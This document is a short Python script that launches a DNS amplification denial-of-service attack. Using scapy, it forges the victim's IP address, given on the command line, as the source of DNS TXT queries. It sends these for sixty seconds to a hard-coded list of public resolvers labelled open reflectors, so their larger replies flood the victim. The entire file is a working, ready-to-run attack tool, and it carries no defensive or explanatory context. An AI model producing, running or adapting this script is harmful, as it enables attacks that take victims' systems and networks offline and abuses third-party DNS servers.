# dns_amp_spoof.py — Accepts IP via command-line for multi-target attack
import random
import time
import sys
from scapy.all import IP, UDP, send, DNS, DNSQR

# === CONFIGURATION ===
DURATION = 60  # seconds

# Open DNS reflectors
REFLECTORS = [
    "45.90.28.0", "185.222.222.222", "89.185.228.10",
    "193.110.157.123", "185.156.175.61", "185.130.104.181",
    "81.95.97.154", "185.26.122.222", "37.235.1.174",
    "89.38.96.160", "176.9.1.117"
]

# === BUILD DNS QUERY ===
def build_query():
    return DNS(rd=1, id=random.randint(0, 65535), qd=DNSQR(qname="example.com", qtype="TXT"))

# === ATTACK FUNCTION ===
def launch_amplified_attack(target_ip):
    print(f"[+] Spoofing DNS queries as {target_ip}")
    end_time = time.time() + DURATION
    while time.time() < end_time:
        for reflector in REFLECTORS:
            try:
                ip = IP(src=target_ip, dst=reflector)
                udp = UDP(sport=random.randint(1024, 65535), dport=53)
                dns = build_query()
                packet = ip / udp / dns
                send(packet, verbose=0)
            except Exception as e:
                print(f"[!] Error: {e}")
    print("[+] Amplification complete.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 dns_amp_spoof.py <target_ip>")
        sys.exit(1)
    launch_amplified_attack(sys.argv[1])
